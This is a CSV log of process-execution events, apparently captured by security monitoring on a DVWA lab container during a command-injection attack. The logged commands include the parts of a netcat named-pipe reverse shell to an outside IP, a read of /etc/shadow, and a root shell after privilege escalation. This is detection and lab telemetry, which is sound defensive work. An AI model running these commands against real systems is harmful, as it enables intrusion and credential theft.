@timestamp,agent.hostname,command,cwd,event.ingested,filename,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.type,host.os.version,message,sid,tty,uid
"Oct 24, 2022 @ 23:21:10.554",dvwa_web,bash,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:21:11.556",/bin/bash,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/bash]: bash,238862,(none),0
"Oct 24, 2022 @ 23:19:26.542",dvwa_web,cat /etc/shadow,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:27.545",/bin/cat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/cat]: cat /etc/shadow,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,ping -c 4,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.544",/bin/ping,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/ping]: ping -c 4,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,sleep 3,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.544",/bin/sleep,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/sleep]: sleep 3,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,mkfifo /tmp/f,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.544",/usr/bin/mkfifo,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/usr/bin/mkfifo]: mkfifo /tmp/f,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,cat /tmp/f,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.544",/bin/cat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/cat]: cat /tmp/f,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,bash -i,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.544",/bin/bash,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/bash]: bash -i,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,nc 123.123.123.250 9001,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.544",/bin/nc,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/bin/nc]: nc 123.123.123.250 9001,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,whoami,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.544",/usr/bin/whoami,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/usr/bin/whoami]: whoami,238862,(none),33
"Oct 24, 2022 @ 23:19:20.541",dvwa_web,id,/var/www/html/vulnerabilities/exec,"Oct 24, 2022 @ 23:19:21.545",/usr/bin/id,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/var/www/html/vulnerabilities/exec filename:/usr/bin/id]: id,238862,(none),33
